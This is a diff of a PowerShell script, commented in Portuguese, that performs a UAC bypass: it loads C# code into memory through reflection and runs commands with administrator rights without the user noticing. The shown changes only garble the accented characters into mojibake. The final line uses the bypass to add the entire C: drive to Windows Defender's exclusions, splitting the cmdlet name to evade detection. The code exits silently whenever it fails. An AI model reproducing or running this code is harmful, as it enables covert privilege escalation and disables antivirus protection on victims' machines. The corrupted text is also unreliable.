@@ -3,10 +3,10 @@ function latencyx-Invoke-UAC
 <#
  
 .SYNOPSIS
-Este script serve para fazer um bypass de UAC (Controle de Contas de Usuário) em um Windows onde o usuário atual está no grupo de administradores e a configuração de UAC está no padrão. Ele eleva os privilégios de maneira transparente.
+Este script serve para fazer um bypass de UAC (Controle de Contas de UsuÃ¡rio) em um Windows onde o usuÃ¡rio atual estÃ¡ no grupo de administradores e a configuraÃ§Ã£o de UAC estÃ¡ no padrÃ£o. Ele eleva os privilÃ©gios de maneira transparente.
 
 .DESCRIPTION
-Este script usa código em C# para ser carregado na memória com PowerShell usando reflection, e então invoca a função `latencyx-Execute` do código C# carregado, que executará o comando com altos privilégios (administrador).
+Este script usa cÃ³digo em C# para ser carregado na memÃ³ria com PowerShell usando reflection, e entÃ£o invoca a funÃ§Ã£o `latencyx-Execute` do cÃ³digo C# carregado, que executarÃ¡ o comando com altos privilÃ©gios (administrador).
 
 .PARAMETER Executable
 .PARAMETER Command
@@ -126,7 +126,7 @@ try {
 }
 
 if (!$latencyxAdm) {
-    return  # Silenciosamente sai se o usuário não é administrador
+    return  # Silenciosamente sai se o usuÃ¡rio nÃ£o Ã© administrador
 }
 
 try {
@@ -135,7 +135,7 @@ try {
         if (![System.IO.File]::Exists($latencyxEx.Source)) {
             $latencyxExecutable = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($latencyxExecutable)
             if (![System.IO.File]::Exists($latencyxExecutable)) {
-                return  # Silenciosamente sai se o executável não for encontrado
+                return  # Silenciosamente sai se o executÃ¡vel nÃ£o for encontrado
             }
         } else {
             $latencyxExecutable = (Get-Command $latencyxExecutable).Name
@@ -170,7 +170,7 @@ function latencyxExecute {
     }
 
     if ($latencyxResult) {
-        return  # Silenciosamente sai se a elevação for bem-sucedida
+        return  # Silenciosamente sai se a elevaÃ§Ã£o for bem-sucedida
     } else {
         return  # Silenciosamente sai se ocorrer um erro
     }
@@ -190,5 +190,5 @@ if ($latencyxProcess -eq "cmstp") {
 
 }
 
-# Chamada da função
+# Chamada da funÃ§Ã£o
 latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
